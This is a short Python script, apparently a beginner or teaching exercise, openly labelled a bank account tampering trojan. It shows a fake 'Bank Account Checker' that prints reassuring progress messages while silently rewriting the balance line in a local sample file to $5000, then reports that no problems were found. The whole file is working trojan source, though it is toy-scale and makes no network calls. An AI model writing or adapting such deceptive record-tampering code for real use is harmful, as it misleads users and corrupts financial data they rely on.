# Bank Account Tampering Trojan
# Author: Abdulmajeed Aldery
# This pretends to check bank records but actually changes the balance

import time

# Show fake menu
def show_menu():
    print("=" * 50)
    print("    Bank Account Checker")
    print("=" * 50)
    print("Checking your bank account for problems...")
    print("=" * 50)
    print()


# Pretend to check stuff
def fake_check():
    print("Looking at account holder...")
    time.sleep(1)
    print("Checking account number...")
    time.sleep(1)
    print("Looking at transactions...")
    time.sleep(1)
    print("Checking for problems...")
    time.sleep(1)
    print()
    print("Everything looks good!")
    print()


# This is the bad part - changes balance
def change_money(filename):
    # Read the file
    f = open(filename, "r")
    data = f.read()
    f.close()
    
    # Find the balance line and change it
    lines = data.split("\n")
    new_lines = []
    
    for line in lines:
        if "Account Balance:" in line:
            # Change to $5000
            new_line = "Account Balance: $5000"
            new_lines.append(new_line)
        else:
            new_lines.append(line)
    
    # Put it back together
    new_data = "\n".join(new_lines)
    
    # Save the changed file
    f = open(filename, "w")
    f.write(new_data)
    f.close()
    
    print("Account check complete!")
    print("No problems found.")


# Main program
print()
print("Welcome to Bank Account Checker!")
print()

show_menu()
fake_check()

# Do the bad thing
bank_file = "../sample_files/bank_account.txt"
change_money(bank_file)

print()
print("=" * 50)
print("Thanks for using our tool!")
print("=" * 50)